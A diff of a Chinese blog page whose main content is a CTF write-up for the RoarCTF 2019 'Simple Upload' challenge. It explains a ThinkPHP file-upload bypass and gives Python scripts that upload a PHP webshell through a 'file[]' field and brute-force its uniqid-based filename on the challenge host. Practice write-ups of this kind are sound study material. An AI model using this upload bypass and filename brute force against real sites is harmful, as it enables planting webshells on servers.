@@ -6,17 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2020 | ohou</title>
+  <title>[RoarCTF 2019]Simple Upload | ohou</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="BUU在校大学生，小学曾获“三好学生”称号">
-<meta property="og:type" content="website">
-<meta property="og:title" content="ohou">
-<meta property="og:url" content="http://example.com/archives/2020/index.html">
+  <meta name="description" content="Think PHP文件上传 Think PHP 的默认文件上传路径是 &#x2F;home&#x2F;index&#x2F;uploadThink PHP 中的 upload() 函数在没有参数传入的情况下是可以批量上传文件的  源码分析：1234$uploadFile &#x3D; $_FILES[&amp;#x27;file&amp;#x27;] ;if (strstr(strtolower($uploadFile[&amp;#x27;name&amp;#x27;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[RoarCTF 2019]Simple Upload">
+<meta property="og:url" content="http://example.com/2020/11/08/RoarCTF-2019-Simple-Upload/index.html">
 <meta property="og:site_name" content="ohou">
-<meta property="og:description" content="BUU在校大学生，小学曾获“三好学生”称号">
+<meta property="og:description" content="Think PHP文件上传 Think PHP 的默认文件上传路径是 &#x2F;home&#x2F;index&#x2F;uploadThink PHP 中的 upload() 函数在没有参数传入的情况下是可以批量上传文件的  源码分析：1234$uploadFile &#x3D; $_FILES[&amp;#x27;file&amp;#x27;] ;if (strstr(strtolower($uploadFile[&amp;#x27;name&amp;#x27;">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201108161134465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lJSEFIVUhB,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="article:published_time" content="2020-11-08T12:26:28.000Z">
+<meta property="article:modified_time" content="2020-11-08T12:28:34.877Z">
 <meta property="article:author" content="zeng-jiahao">
+<meta property="article:tag" content="ctf-wp">
+<meta property="article:tag" content="upload">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201108161134465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lJSEFIVUhB,size_16,color_FFFFFF,t_70#pic_center">
   
     <link rel="alternative" href="/atom.xml" title="ohou" type="application/atom+xml">
   
@@ -160,36 +166,94 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-RoarCTF-2019-Simple-Upload" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      [RoarCTF 2019]Simple Upload
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/08/RoarCTF-2019-Simple-Upload/" class="archive-article-date">
+
+        
+        <a href="/2020/11/08/RoarCTF-2019-Simple-Upload/" class="archive-article-date">
   	<time datetime="2020-11-08T12:26:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-08</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/08/RoarCTF-2019-Simple-Upload/">[RoarCTF 2019]Simple Upload</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="Think-PHP文件上传"><a href="#Think-PHP文件上传" class="headerlink" title="Think PHP文件上传"></a>Think PHP文件上传</h4><blockquote>
+<p>Think PHP 的默认文件上传路径是 /home/index/upload<br>Think PHP 中的 upload() 函数在没有参数传入的情况下是可以批量上传文件的</p>
+</blockquote>
+<h4 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line"><span class="keyword">if</span> (strstr(strtolower(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
+<p>只会对文件名为 <code>file</code> 的上传文件进行扩展名的检验。但是对其他文件名的上传文件不会进行扩展名检验。</p>
+<p>原题中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$upload</span>-&gt;allowExts = array(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);// 设置附件上传类型</span><br></pre></td></tr></table></figure>
+
+<p>上面的设置方法是错误的。thinkphp 3.2中设置允许上传文件的后缀名的方法是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$upload</span>-&gt;exts = array(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);// 设置附件上传类型</span><br></pre></td></tr></table></figure>
+
+<p>所以这里的对文件名的白名单设置时无效的。</p>
+<blockquote>
+<p>综上，压根就没有对上传文件做严格的检测，我们甚至只需要上传一个input标签name值不为file都行，只是这样的话，后端不会返回文件路径，所以需要上传一个文件名为file的文件来猜测uniqid函数返回文件路径的大致范围。</p>
+</blockquote>
+<p><strong>脚本上传文件：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件上传的目标路径</span></span><br><span class="line">url = <span class="string">&#x27;http://6345673e-18e8-4130-9ff2-d0151b42dfa0.node3.buuoj.cn/index.php/home/index/upload&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#两种文件变量</span></span><br><span class="line">file1 = &#123;<span class="string">&#x27;file&#x27;</span>:open(<span class="string">&#x27;zjh.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line">file2 = &#123;<span class="string">&#x27;file[]&#x27;</span>:open(<span class="string">&#x27;zjh.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#交替上传，输出返回值</span></span><br><span class="line">r = requests.post(url, files = file1)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files = file2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files = file1)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/blob/master/Web/simple_upload/docker/html/ThinkPHP/Library/Think/Upload.class.php#L27">题目源码</a> </p>
+<p>为什么要上传一次 <code>zjh.txt</code> ，然后上传 <code>zjh.php</code> 再上传 <code>zjh.txt</code> 。先看文件名生成的代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;saveName&#x27;</span>     =&gt; array(<span class="string">&#x27;uniqid&#x27;</span>, <span class="string">&#x27;&#x27;</span>), //上传文件命名规则，[0]-函数名，[1]-参数，多个参数使用数组 </span><br></pre></td></tr></table></figure>
+
+<p>使用的是 <code>uniqid</code> 来生成文件名，它是基于微秒的当前时间来更改文件名的。<br>所以知道 <code>zjh.txt</code> 前后的生成的文件名，就可以爆破出 真正的木马文件 <code>zjh.php</code> 的文件名。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108161134465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lJSEFIVUhB,size_16,color_FFFFFF,t_70#pic_center"><br>根据返回的 <code>zjh.txt</code> 修改后的文件名开始爆破 <code>zjh.php</code> 修改后的文件名。</p>
+<p>爆破脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">dir = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;23456&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dir:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> dir:</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> dir:</span><br><span class="line">                <span class="keyword">for</span> w <span class="keyword">in</span> dir:</span><br><span class="line">                    url = <span class="string">&#x27;http://6345673e-18e8-4130-9ff2-d0151b42dfa0.node3.buuoj.cn/index.php/Public/Upload/2020-11-08/5fa7d8be&#x27;</span>+i+j+k+q+w+<span class="string">&#x27;.php&#x27;</span></span><br><span class="line">                    r = requests.get(url)</span><br><span class="line">                    <span class="keyword">if</span> r.status_code == 429:<span class="comment">#规避过于频繁访问导致的429</span></span><br><span class="line">                        time.sleep(0.1)</span><br><span class="line">                    <span class="keyword">elif</span> r.status_code != 404:<span class="comment">#输出非404页面</span></span><br><span class="line">                        <span class="built_in">print</span>(url + <span class="string">&#x27;=&#x27;</span> + r.status_code)</span><br><span class="line">                    <span class="keyword">elif</span> r.status_code == 200:<span class="comment">#存在页面就输出</span></span><br><span class="line">                        <span class="built_in">print</span>(url)</span><br><span class="line">                    <span class="built_in">break</span></span><br></pre></td></tr></table></figure>
+
+<p>因为buuoj的防御机制。试了好多次还是不行。。提交次数过多就会强制断开连接。放弃了爆破………</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/wexinpay.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -205,350 +269,119 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/11/08/RoarCTF-2019-Simple-Upload/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/07/BUUCTF-Upload/" class="archive-article-date">
-  	<time datetime="2020-11-07T06:43:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-07</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/11/07/BUUCTF-Upload/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">BUUCTF-Upload-01</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/07/BUUCTF-Upload/">BUUCTF-Upload-01</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">ctf-wp</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">upload</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Think-PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">Think PHP文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">源码分析：</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9ADVWA%E5%92%8CUpload-Labs/" class="archive-article-date">
-  	<time datetime="2020-11-06T07:19:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9ADVWA%E5%92%8CUpload-Labs/">文件上传：DVWA和Upload_Labs</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">ctf-wp</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件上传</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/04/2-4-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/" class="archive-article-date">
-  	<time datetime="2020-11-04T09:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/04/2-4-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/">2.4-进程同步</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">操作系统</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">进程同步</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/28/%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5-%E4%B8%B4%E7%95%8C%E8%B5%84%E6%BA%90%E7%9A%84%E5%88%86%E9%85%8D%E7%AE%97%E6%B3%95/" class="archive-article-date">
-  	<time datetime="2020-10-28T06:21:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-28</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/28/%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5-%E4%B8%B4%E7%95%8C%E8%B5%84%E6%BA%90%E7%9A%84%E5%88%86%E9%85%8D%E7%AE%97%E6%B3%95/">进程同步_临界资源的分配算法</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">操作系统</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">进程</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">临界资源</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/07/XSS-Lab%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2/" class="archive-article-date">
-  	<time datetime="2020-10-07T05:46:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/07/XSS-Lab%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2/">XSS_Lab刷题笔记-2</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">ctf-wp</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/codes//" class="article-tag-list-link color1">codes</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/01/XSS-Lab%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-10-01T15:09:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/01/XSS-Lab%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">XSS-Lab刷题笔记</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">ctf-wp</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/codes//" class="article-tag-list-link color1">codes</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/27/bugkuctf-%E6%B1%9F%E6%B9%96%E8%80%81%E9%AD%94-wp/" class="archive-article-date">
-  	<time datetime="2020-09-27T09:52:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/09/27/bugkuctf-%E6%B1%9F%E6%B9%96%E8%80%81%E9%AD%94-wp/">bugkuctf-江湖老魔-wp</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">ctf-wp</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">js</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/code//" class="article-tag-list-link color5">code</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -571,8 +404,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
